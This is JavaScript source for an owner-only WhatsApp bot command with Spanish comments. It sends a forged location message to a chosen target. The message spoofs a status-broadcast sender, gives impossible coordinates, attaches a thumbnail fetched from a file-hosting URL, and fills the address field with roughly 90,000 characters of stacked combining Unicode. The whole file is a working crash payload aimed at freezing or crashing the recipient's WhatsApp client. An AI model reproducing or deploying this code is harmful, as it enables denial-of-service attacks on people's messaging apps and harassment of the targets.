import fetch from 'node-fetch'

let handler = async (m, { conn }) => {
  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat
  if (jid === conn.user.id) {
    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m })
  }

  const objetivo = jid

  const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵'
  const repeticiones = 266
  const caracteresPorRepeticion = caracter.length
  const totalBase = repeticiones * caracteresPorRepeticion
  const faltan = 90000 - totalBase

  const textoLargo = caracter.repeat(repeticiones) + caracter.slice(0, faltan)

  // 🖼️ URL de Catbox con tu imagen .jpg (peso recomendado: 300–400 KB)
  const catboxUrl = 'https://files.catbox.moe/ufwba7.jpeg' // reemplaza por la tuya
  const res = await fetch(catboxUrl)
  const thumbnail = await res.buffer()

  const fakeLoc = {
    key: {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(m.chat ? { remoteJid: "status@broadcast" } : {})
    },
    message: {
      locationMessage: {
        name: 'Tobi',
        degreesLatitude: 99.9999999999999999,
        degreesLongitude: -99.99999999999999,
        address: textoLargo,
        jpegThumbnail: thumbnail,
        isLive: false
      }
    }
  }

  await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() })
}

handler.command = /^pito|ubithumburl$/i
handler.owner = true

export default handler